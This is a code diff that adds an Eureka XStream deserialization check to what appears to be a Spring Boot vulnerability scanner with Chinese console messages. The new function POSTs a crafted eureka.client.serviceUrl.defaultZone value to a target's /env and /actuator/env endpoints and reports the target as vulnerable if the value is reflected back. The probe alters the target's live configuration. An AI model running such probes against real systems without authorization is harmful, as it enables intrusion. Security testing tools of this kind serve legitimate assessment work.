@@ -316,6 +316,46 @@ def SnakeYAML_RCE(url,proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
+def Eureka_xstream_RCE(url,proxies):
+    cprint("======开始对目标URL进行Eureka_Xstream反序列化漏洞测试======","green")
+    Headers_1 = {
+        "User-Agent": random.choice(ua),
+        "Content-Type": "application/x-www-form-urlencoded"
+        }
+    Headers_2 = {
+        "User-Agent": random.choice(ua),
+        "Content-Type": "application/json"
+        }
+    payload_1 = "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
+    payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"
+    path1 = 'env'
+    path2 = 'actuator/env'
+    
+    try:
+        requests.packages.urllib3.disable_warnings()
+        urltest1 = url + path1
+        urltest2 = url + path2
+        re1 = requests.post(url=urltest1, headers=Headers_1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=urltest2, headers=Headers_2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        if ('127.0.0.2' in str(re1.text)):
+            cprint("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 1.x：", "red")
+            cprint('漏洞存在路径为 ' + urltest1 + '\n', "red")
+            cprint('POST数据包内容为 ' + payload_1 + '\n', "red")
+        elif ('127.0.0.2' in str(re2.text)):
+            cprint("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 2.x：", "red")
+            cprint('漏洞存在路径为 ' + urltest2 + '\n', "red")
+            cprint('POST数据包内容为 ' + payload_2 + '\n', "red")
+        else:
+            cprint("[-] 未发现Eureka_Xstream反序列化漏洞\n", "yellow")
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
+
 def vul(url,proxies):
     CVE_2021_21234(url, proxies)
     CVE_2022_22947(url, proxies)
@@ -324,5 +364,6 @@ def vul(url,proxies):
     SnakeYAML_RCE(url, proxies)
     JolokiaRCE(url,proxies)
     JeeSpring_2023(url, proxies)
+    Eureka_xstream_RCE(url,proxies)
     cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
     sys.exit()
